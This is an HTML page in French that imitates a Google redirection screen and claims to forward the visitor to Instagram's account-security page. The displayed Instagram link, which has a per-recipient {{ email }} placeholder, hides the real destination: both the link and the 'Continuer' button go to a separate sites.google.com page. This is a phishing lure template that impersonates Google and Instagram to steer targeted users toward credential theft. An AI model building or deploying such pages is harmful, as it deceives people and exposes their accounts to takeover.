<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Redirection - Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Définition d'une police proche de celle utilisée par Google (par défaut sans serif) */
        body {
            font-family: Roboto, Arial, sans-serif;
            background-color: #ffffff; /* Fond blanc */
        }
        /* Style simple pour le conteneur principal, centré verticalement et horizontalement */
        .login-box {
            max-width: 450px; /* Largeur typique pour un panneau Google */
            padding: 48px 40px 36px;
            margin: 100px auto 0;
            border: 1px solid #dadce0; /* Bordure légère */
            border-radius: 8px; /* Coins arrondis */
            background-color: #fff;
        }
        /* Style du bouton "Continuer" pour un look simple et bleu/primaire */
        .button-primary {
            background-color: #1a73e8; /* Bleu Google */
            color: #ffffff;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            cursor: pointer;
            transition: background-color 0.2s;
            font-size: 14px;
        }
        .button-primary:hover {
            background-color: #1669c5; /* Bleu légèrement plus foncé au survol */
        }
        /* Style pour le texte de lien simple */
        .redirect-link {
            color: #3c4043; /* Couleur de texte sombre standard */
            font-size: 14px;
            word-break: break-all; /* Important pour les longues URL */
            display: inline-block;
            margin-bottom: 24px;
        }
    </style>
</head>
<body>

    <div class="login-box">

        <svg class="mb-6 mx-auto" width="75" height="24" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <g clip-path="url(#clip0_2_1)">
                <text x="0" y="20" style="font-family:'Google Sans',Arial,sans-serif;font-weight:500;font-size:24px;fill:#5f6368;">Google</text>
            </g>
            <defs>
                <clipPath id="clip0_2_1">
                    <rect width="75" height="24" fill="white"/>
                </clipPath>
            </defs>
        </svg>

        <h1 class="text-2xl mb-6 text-center text-gray-700">Redirection</h1>

        <p class="mb-6 text-base text-gray-700">
            Vous allez être redirigé vers **Instagram**. Cliquez sur **Continuer** pour poursuivre...
        </p>

        <div class="redirect-link">
            <a href="https://sites.google.com/view/redirect-instagram" target="_blank" class="text-blue-600 hover:underline">
                https://www.instagram.com/accounts/security?email={{ email }}
            </a>
        </div>
        
        <div class="flex justify-end">
            <a href="https://sites.google.com/view/redirect-instagram" target="_blank">
                <button type="submit" class="button-primary">Continuer</button>
            </a>
        </div>

    </div>

</body>
</html>
